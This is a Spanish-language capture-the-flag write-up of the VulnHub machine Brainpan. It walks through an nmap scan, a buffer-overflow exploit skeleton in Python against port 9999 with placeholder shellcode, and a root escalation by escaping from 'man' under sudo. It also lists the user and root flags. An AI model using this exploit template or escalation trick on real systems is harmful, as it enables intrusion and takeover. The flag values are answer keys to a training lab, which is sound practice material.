---
title: "Brainpan - VulnHub"
description: "Writeup de Brainpan, una máquina de VulnHub enfocada en Buffer Overflow y explotación binaria."
pubDate: 2024-10-20
platform: "vulnhub"
category: "machines"
difficulty: "medium"
os: "linux"
language: es
tags: ["buffer-overflow", "binary-exploitation", "ret2libc"]
retired: false
heroImage: "/images/writeups/vulnhub/brainpan-card.png"
---

# Brainpan - VulnHub Writeup

**Dificultad**: Medium  
**OS**: Linux  
**Plataforma**: VulnHub

## Reconocimiento

Iniciamos con un escaneo de Nmap:

```bash
nmap -sC -sV -p- 192.168.1.100
```

**Puertos abiertos:**
- 9999/tcp (Aplicación personalizada)
- 10000/tcp (SimpleHTTPServer)

## Enumeración Web

Al acceder al puerto 10000, encontramos un servidor web con una aplicación web simple.

## Análisis de Buffer Overflow

Descargamos el binario `brainpan.exe` del servidor web y lo analizamos localmente.

### Pasos de explotación:

1. **Fuzzing** para encontrar el offset
2. **Control de EIP**
3. **Búsqueda de JMP ESP**
4. **Generación de shellcode**
5. **Explotación**

```python
import socket

# Shellcode generado con msfvenom
shellcode = b"\x90" * 16 + b"..."

offset = 524
eip = b"\xf3\x12\x17\x31"  # JMP ESP

payload = b"A" * offset + eip + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 9999))
s.send(payload)
```

## Escalada de Privilegios

Una vez dentro, encontramos que podemos ejecutar `anansi_util` como root.

```bash
sudo /home/anansi/bin/anansi_util manual man
!/bin/bash
```

¡Shell como root!

## Banderas

- **User Flag**: `a7d355b26bda6bf1196ccffead0b2cf2`
- **Root Flag**: `b6dd3d1d58fdb6f7e2e5f3b0f4b2e5c3`

## Conclusión

Excelente máquina para practicar Buffer Overflow en Linux. Muy recomendada para el OSCP.
